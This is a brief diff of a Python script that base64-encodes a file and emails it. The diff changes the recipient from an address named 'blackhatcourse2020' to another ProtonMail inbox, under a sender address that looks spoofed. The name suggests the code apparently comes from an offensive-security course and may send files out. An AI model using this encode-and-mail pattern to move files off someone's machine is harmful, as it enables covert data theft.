@@ -13,7 +13,7 @@ filecontent = fo.read()
 encodedcontent = base64.b64encode(filecontent)  # base64
 
 sender = 'webmaster@tutorialpoint.com'
-reciever = 'blackhatcourse2020@protonmail.com'
+reciever = 'shalimarbaghouse@protonmail.com'
 
 marker = "AUNIQUEMARKER"
 
